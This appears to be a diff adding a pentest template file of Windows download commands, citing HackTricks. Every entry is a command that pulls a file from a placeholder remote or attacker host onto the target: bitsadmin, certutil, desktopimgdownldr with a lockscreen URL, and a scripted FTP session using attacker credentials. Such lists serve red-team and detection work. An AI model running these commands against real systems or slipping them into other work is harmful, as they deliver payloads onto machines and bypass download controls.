@@ -1,0 +1,13 @@
+# refer: https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters#download
+
+# desc: Bitsadmin.exe
+bitsadmin /create 1 bitsadmin /addfile 1 #{download_path} c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+
+# desc: certutil.exe
+certutil.exe -urlcache -split -f "#{download_path}" s.exe
+
+# desc: Desktopimgdownldr.exe
+set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{download_path} /eventName:desktopimgdownldr
+
+# FTP
+cmd.exe /c "@echo open #{LHOST} 21>ftp.txt&@echo USER #{attacker_username}>>ftp.txt&@echo PASS #{attacker_pwd}>>ftp.txt&@echo binary>>ftp.txt&@echo GET /#{file}>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
